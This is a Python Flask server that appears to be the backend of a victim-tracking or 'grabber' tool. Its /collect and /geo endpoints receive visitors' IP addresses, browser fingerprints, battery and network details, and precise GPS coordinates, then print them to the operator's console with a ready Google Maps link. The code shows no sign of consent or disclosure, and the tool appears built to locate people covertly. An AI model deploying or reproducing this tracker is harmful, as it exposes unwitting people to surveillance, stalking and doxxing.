from flask import Flask, request, jsonify
from flask_cors import CORS
from colorama import Fore
import json, sys

app = Flask(__name__, static_folder='static', static_url_path='/static')
CORS(app)

@app.route("/")
def index():
    return open("index.html").read()

@app.route("/collect", methods=["POST"])
def collect():
    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    data = request.get_json()

    result = {
        "ip": client_ip,
        "user_agent": request.headers.get("User-Agent"),
        "accept_language": request.headers.get("Accept-Language"),
        "referrer": request.referrer,
        "screen": data.get("screen"),
        "timezone": data.get("timezone"),
        "battery": data.get("battery"),
        "network": data.get("network"),
        "fingerprint": data.get("fingerprint")
    }
    
    print(f"""
{Fore.RESET}=========================== INFO ==================================
[{Fore.CYAN}>{Fore.RESET}] ip : {Fore.RED}{result['ip']}{Fore.RESET}
[{Fore.CYAN}>{Fore.RESET}] user_agent : {Fore.RED}{result['user_agent']}{Fore.RESET}
[{Fore.CYAN}>{Fore.RESET}] accept_language : {Fore.RED}{result['accept_language']}{Fore.RESET}
[{Fore.CYAN}>{Fore.RESET}] referrer : {Fore.RED}{result['referrer']}{Fore.RESET}
[{Fore.CYAN}>{Fore.RESET}] screen : {Fore.RED}{result['screen']}{Fore.RESET}
[{Fore.CYAN}>{Fore.RESET}] timezone : {Fore.RED}{result['timezone']}{Fore.RESET}
[{Fore.CYAN}>{Fore.RESET}] battery : {Fore.RED}{result['battery']}{Fore.RESET}
[{Fore.CYAN}>{Fore.RESET}] network : {Fore.RED}{result['network']}{Fore.RESET}
[{Fore.CYAN}>{Fore.RESET}] fingerprint : {Fore.RED}{result['fingerprint']}{Fore.RESET}
{Fore.RESET}===================================================================
    """)
    return jsonify({"status": "ok"})

@app.route("/geo", methods=["POST"])
def geo():
    print(f"Received request to /geo with method: {request.method}")
    data = request.get_json(force=True)
    result = {
        "latitude": data.get("latitude"),
        "longitude": data.get("longitude"),
        "accuracy": data.get("accuracy"),
        "timestamp": data.get("timestamp")
    }
    print(f"""
{Fore.RESET}=========== GEO =================
[{Fore.CYAN}>{Fore.RESET}] latitude : {Fore.RED}{result['latitude']}{Fore.RESET}
[{Fore.CYAN}>{Fore.RESET}] longitude : {Fore.RED}{result['longitude']}{Fore.RESET}
[{Fore.CYAN}>{Fore.RESET}] accuracy : {Fore.RED}{result['accuracy']}{Fore.RESET}
[{Fore.CYAN}>{Fore.RESET}] timestamp : {Fore.RED}{result['timestamp']}{Fore.RESET}
[{Fore.CYAN}@{Fore.RESET}] lat & longitude : {Fore.RED}{result['latitude']},{result['longitude']}{Fore.RESET}
[{Fore.CYAN}@{Fore.RESET}] Googlemap : {Fore.RED}https://www.google.com/maps/place/{result['latitude']},{result['longitude']}{Fore.RESET}
{Fore.RESET}=================================""")
    sys.stdout.flush()
    return jsonify({"status": "ok"})

@app.route("/geolocation", methods=["POST"])
def geolocation():
    print(f"Received request to /geolocation with method: {request.method}")
    return geo()

if __name__ == "__main__":
    port = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[1] == "--port" else 5000
    app.run(host="127.0.0.1", port=port, debug=False)